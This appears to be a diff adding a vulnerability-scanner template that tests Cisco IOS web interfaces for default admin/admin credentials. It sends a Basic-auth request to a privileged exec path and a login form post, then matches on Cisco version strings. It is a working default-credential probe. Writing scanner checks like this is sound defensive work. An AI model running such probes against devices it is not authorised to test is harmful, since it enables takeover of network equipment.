@@ -1,0 +1,21 @@
+name: Cisco IOS Default Credentials
+description: Attempts to authenticate to Cisco IOS devices via web management interface using default admin/admin credentials. Successful access allows full network device configuration and routing manipulation.
+severity: critical
+cwe: CWE-1392
+
+requests:
+  - method: GET
+    path: /level/15/exec/-/show/version
+    headers:
+      Authorization: "Basic YWRtaW46YWRtaW4="
+  - method: POST
+    path: /login.html
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "uname=admin&pwd=admin&subId=passPage"
+
+matchers:
+  - body_contains: "Cisco IOS"
+  - body_contains: "show version"
+  - body_contains: "Cisco Internetwork"
+  - status_code: 200
